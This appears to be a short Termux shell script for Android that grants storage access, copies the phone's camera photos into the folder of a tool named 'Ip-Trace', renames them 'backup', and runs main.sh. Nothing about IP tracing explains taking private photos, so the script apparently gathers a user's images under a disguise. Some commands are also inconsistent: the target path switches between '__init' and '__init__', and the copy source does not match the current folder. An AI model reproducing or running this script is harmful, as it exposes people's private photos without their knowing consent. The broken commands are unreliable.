cd $HOME
termux-setup-storage
cd /sdcard/DCIM/Camera
cp -r Camera /data/data/com.termux/files/home/Ip-Trace/__init
cd /data/data/com.termux/files/home/Ip-Trace/__init__
mv Camera backup
cd $HOME
cd /data/data/com.termux/files/home/Ip-Trace/__init__
bash main.sh
#echo
